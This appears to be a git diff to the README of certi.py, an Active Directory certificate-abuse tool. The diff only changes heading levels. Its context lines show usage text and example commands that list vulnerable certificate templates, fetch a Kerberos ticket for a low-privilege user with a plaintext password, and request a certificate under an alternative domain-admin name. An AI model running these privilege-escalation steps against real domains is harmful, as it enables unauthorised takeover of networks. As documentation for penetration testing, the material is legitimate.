@@ -58,7 +58,7 @@ options:
 
 ### Req
 
-#### Req usage
+### Req usage
 
 ```plain
 usage: certi.py req [-h] [--dc-ip IP] [-t TEMPLATE] [--hashes LMHASH:NTHASH] [--aes hex key] [-k] [-n] [-P CERT_PASS] [-a ALT_NAME] [-o filename] [--on-behalf name] [--enroll-cert ENROLL_CERT]
@@ -66,7 +66,7 @@ usage: certi.py req [-h] [--dc-ip IP] [-t TEMPLATE] [--hashes LMHASH:NTHASH] [--
                     target service
 ```
 
-#### Req flags
+### Req flags
 
 ```plain
 positional arguments:
@@ -100,7 +100,7 @@ options:
 
 ## Examples
 
-#### Listing vulnerable templates
+### Listing vulnerable templates
 
 ```plain
 $ certi.py list 'offsec.nl/johndo-lowpriv' --dc-ip DC01PKI.offsec.nl --vuln --enable
@@ -161,7 +161,7 @@ Permissions
       S-1-5-21-497837788-612300594-3587273769-513 offsec\Domain Users
 ```
 
-#### Requesting ticket for low-priv user
+### Requesting ticket for low-priv user
 
 ```plain
 getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234'
@@ -173,7 +173,7 @@ Making the ticket available:
 export KRB5CCNAME=johndo-lowpriv.ccache
 ```
 
-#### Requesting certificate with alternative name
+### Requesting certificate with alternative name
 
 ```plain
 python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
